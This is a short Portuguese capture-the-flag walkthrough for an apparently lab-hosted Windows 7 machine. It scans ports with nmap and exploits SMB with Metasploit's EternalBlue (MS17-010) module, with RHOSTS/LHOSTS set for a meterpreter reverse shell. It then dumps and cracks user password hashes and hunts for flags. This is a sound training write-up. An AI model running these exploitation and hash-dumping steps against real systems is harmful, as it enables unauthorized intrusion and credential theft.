## Recon
Quantidades de portas abertas:

```shell
nmap 10.80.161.48 -p 0-1002 -sV
```

![[Pasted image 20260212231538.png]]

Temos a porta 445 que rodar **microsoft-ds** com o windows 7, se jogarmos isso no google, conseguimos encontrar 
![[Pasted image 20260212232409.png]]

Agore temos um exploit, podemos partir para parte de ganhar acesso.


## Gain Acess

Após iniciar o Metasploit

```shell
msfconsole
```

Podemos utilizar a busca usando o `search`
``` bash
search MS17-010
```

![[Pasted image 20260212232727.png]]
setando  o  eternalblue como exploit
```
use exploit/windows/smb/ms17_010_eternalblue
```
Agora é só utilizar o exploit e configurar o RHOSTS :

![[Pasted image 20260213005243.png]]
```
set RHOSTS <ip-alvo>
set LHOSTS <seu-ip>
```

Logo após só precisando executar com:
```
exploit
```

Esse exploit já tem o meterpreter configurado por padrão e escalona os serviços.
## Cracking Hash

Agora precisaremos conseguir as senhas dos usuarios:
![[Pasted image 20260213005830.png]]

pegando essas hashs do SO podemos verificar qual é a senha.
![[Pasted image 20260213010012.png]]

## Encontrando flags

A primeira flag está no `C:\`

e para encontrar o resto irei usar  o `search` para encontrara as outras:
![[Pasted image 20260213010436.png]]